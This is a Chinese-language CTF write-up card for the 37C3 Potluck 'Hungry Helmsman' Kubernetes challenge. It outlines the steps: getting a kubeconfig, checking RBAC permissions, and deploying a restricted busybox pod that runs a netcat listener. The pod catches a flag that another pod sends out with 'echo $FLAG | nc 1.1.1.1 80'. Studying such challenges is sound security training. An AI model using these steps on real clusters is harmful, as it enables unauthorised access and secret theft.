---
title: "37C3 Potluck CTF – Hungry Helmsman"
category: web
tags: ["37C3 Potluck CTF", "web", "Kubernetes", "kubeconfig", "RBAC", "namespace权限"]
signals: ["37C3 Potluck CTF 2023", "Kubernetes", "kubeconfig", "RBAC", "namespace权限", "PodSecurity restricted", "ResourceQuota", "NetworkPolicy", "flag-sender", "auth_bypass", "Potluck", "CTF", "Hungry", "Helmsman"]
difficulty: medium
source: "https://www.ctfiot.com/154453.html"
tools: ["netcat"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 37C3 Potluck CTF – Hungry Helmsman

> 赛事：37C3 Potluck CTF 2023 | 方向：web | 难度：medium | 工具：netcat

## 一句话总结

37C3 Potluck CTF Hungry Helmsman — Kubernetes RBAC+PodSecurity+ResourceQuota+NetworkPolicy 链：拿 Kubeconfig → 创建受约束 pod → 监听 80 端口等 flag-sender nc 推 $FLAG。

## 攻击链

1. nc challenge10.play.potluckctf.com 8888 拿 Kubeconfig (含 token JWT)
2. kubectl --kubeconfig config 切换上下文
3. kubectl get ns 看到 flag-sender + flag-reciever 两个 namespace
4. kubectl get pods -n flag-sender 看到 flag-sender-xxx pod, command=while true; do echo $FLAG | nc 1.1.1.1 80; done
5. kubectl auth can-i --list -n flag-reciever 看到 pods.* create/delete 权限
6. 创建 busybox pod, PodSecurity restricted 要求: allowPrivilegeEscalation=false, drop=["ALL"], runAsNonRoot=true, seccompProfile=RuntimeDefault
7. ResourceQuota 要求: limits.cpu 200m, limits.memory 100M, requests.cpu 100m, requests.memory 50M
8. 加 resources.requests/limits + securityContext
9. NetworkPolicy 允许 ns=flag-sender + app=flag-sender 入向任意端口
10. 改 busybox args 为 ["sh", "-c", "nc -l -v -p 80"] 在 80 端口监听, 接收 flag-sender 的 $FLAG 外发

## 关键 payload

```
Kubeconfig token / RBAC pods.* create/delete / PodSecurity restricted securityContext / ResourceQuota 50M/100m / NetworkPolicy ns=flag-sender + app=flag-sender / busybox nc -l -v -p 80
```

## 经验教训

K8s RBAC 边界是 namespace；PodSecurity restricted 是 v1.25+ 默认；NetworkPolicy 控制 ingress/egress 是常见容器逃逸限制；busybox 镜像通常白名单。

## 标签

Kubernetes、kubeconfig、RBAC、namespace权限、PodSecurity restricted、ResourceQuota、NetworkPolicy、flag-sender、flag-reciever、nc -l 监听、busybox

## 参考来源

- https://www.ctfiot.com/154453.html
- 原文件：37C3_Potluck_CTF_–_Hungry_Helmsman.full.md
